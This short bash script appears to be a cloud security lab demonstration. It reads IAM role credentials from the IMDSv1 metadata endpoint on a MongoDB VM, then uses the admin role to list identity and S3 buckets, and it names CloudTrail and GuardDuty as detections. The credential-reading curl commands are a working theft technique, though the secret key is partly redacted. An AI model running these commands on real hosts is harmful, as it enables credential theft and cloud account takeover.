#!/usr/bin/env bash
# ATTACK: RUN THIS ON THE MONGO VM (after SSHing in). Shows how IMDSv1 + the admin
# instance profile turn a single-host foothold into account takeover.
#
# DETECTED BY: CloudTrail (every API call is logged); GuardDuty flags anomalous or
#   off-instance use of the role credentials.
set -euo pipefail

echo "[*] Reading instance role credentials via IMDSv1 (no session token required):"
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo "    instance role: $ROLE"
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" \
  | sed -E 's/("SecretAccessKey"\s*:\s*")[^"]+/\1<redacted>/'

echo
echo "[*] That role has AdministratorAccess. Proving blast radius:"
aws sts get-caller-identity
echo "[*] Can enumerate every bucket in the account:"
aws s3 ls || true
echo "[*] Could create infrastructure (the exercise's 'able to create VMs'):"
echo "    aws ec2 run-instances --image-id <ami> --instance-type t3.micro   # not executed"
